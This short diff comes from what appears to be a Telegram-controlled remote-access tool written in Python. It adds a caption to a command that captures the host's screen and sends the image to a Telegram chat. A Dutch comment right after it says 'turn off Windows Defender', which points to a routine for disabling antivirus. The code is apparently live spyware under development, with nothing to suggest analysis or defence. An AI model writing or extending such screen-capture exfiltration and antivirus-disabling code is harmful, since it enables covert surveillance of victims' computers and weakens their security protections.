@@ -29,6 +29,7 @@ async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_photo(
         chat_id=update.effective_chat.id,
         photo=open(get_screen(), 'rb'),
+        caption='Screenshot of the main screen'
     )
 
 # Windows defender uitzetten
